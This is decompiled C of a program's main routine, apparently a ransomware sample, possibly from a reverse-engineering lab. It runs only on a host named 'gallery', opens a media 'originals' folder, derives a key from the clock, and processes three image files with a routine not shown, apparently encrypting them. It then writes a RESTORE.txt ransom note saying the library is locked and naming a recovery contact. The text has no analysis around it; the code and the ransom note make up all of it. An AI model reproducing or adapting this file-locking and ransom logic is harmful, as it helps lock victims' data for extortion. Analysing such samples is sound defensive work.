__int64 __fastcall main(int a1, char **a2, char **a3)
{
  unsigned int v3; // ebx
  unsigned int v5; // ebp
  const char **v6; // rbx
  __uid_t st_uid; // r14d
  __int64 v8; // rsi
  unsigned __int64 v9; // rdx
  char *v10; // rbx
  int v11; // eax
  int v12; // r12d
  unsigned __int64 v13; // [rsp+8h] [rbp-200h] BYREF
  struct timespec tp; // [rsp+10h] [rbp-1F8h] BYREF
  struct stat buf; // [rsp+20h] [rbp-1E8h] BYREF
  char v16[32]; // [rsp+B0h] [rbp-158h] BYREF
  char name[264]; // [rsp+D0h] [rbp-138h] BYREF
  unsigned __int64 v18; // [rsp+1D8h] [rbp-30h]

  v18 = __readfsqword(0x28u);
  v3 = 64;
  if ( a1 == 1 )
  {
    if ( gethostname(name, 0x100u) )
    {
      return 64;
    }
    else if ( !strcmp(name, "gallery") )
    {
      if ( geteuid() )
      {
        v5 = open("/srv/gallery/media/originals", 720896);
        if ( (v5 & 0x80000000) != 0 )
        {
          return 65;
        }
        else
        {
          v6 = (const char **)off_3CB0;
          do
          {
            if ( fstatat(v5, *v6, &buf, 256)
              || (buf.st_mode & 0xF000) != 0x8000
              || buf.st_nlink != 1
              || (st_uid = buf.st_uid, st_uid != geteuid())
              || (unsigned __int64)(buf.st_size - 64) > 0x7FFFC0 )
            {
              close(v5);
              return 66;
            }
            ++v6;
          }
          while ( &off_3CB0[3] != (char **)v6 );
          if ( clock_gettime(0, &tp) )
          {
            close(v5);
            return 67;
          }
          else
          {
            v8 = 1000000;
            v9 = tp.tv_nsec % 0xF4240uLL;
            v13 = tp.tv_nsec / 0xF4240uLL + 1000 * tp.tv_sec;
            v10 = v16;
            do
            {
              v8 = sub_1509(&v13, v8, v9);
              sub_1554(v10, v8);
              v10 += 8;
            }
            while ( v10 != name );
            if ( (unsigned int)sub_1574(v5, "yard_0147.jpg", v16)
              || (unsigned int)sub_1574(v5, "yard_0148.jpg", v16)
              || (v3 = sub_1574(v5, "yard_0152.jpg", v16)) != 0 )
            {
              OPENSSL_cleanse(v16, 32);
              close(v5);
              return 68;
            }
            else
            {
              OPENSSL_cleanse(v16, 32);
              v11 = openat(v5, "RESTORE.txt", 655553, 416);
              v12 = v11;
              if ( v11 < 0 )
              {
LABEL_24:
                close(v5);
                __printf_chk(2, "processed=%u\n", 3);
                return v3;
              }
              if ( write(
                     v11,
                     "Your image library has been locked.\n"
                     "Keep the affected files and their names unchanged.\n"
                     "For recovery instructions contact restore@notice.invalid.\n",
                     0x91u) != 145
                || fsync(v12) )
              {
                close(v12);
                close(v5);
                return 69;
              }
              else
              {
                close(v12);
                if ( !fsync(v5) )
                  goto LABEL_24;
                close(v5);
                return 69;
              }
            }
          }
        }
      }
      else
      {
        return 64;
      }
    }
    else
    {
      return 64;
    }
  }
  return v3;
}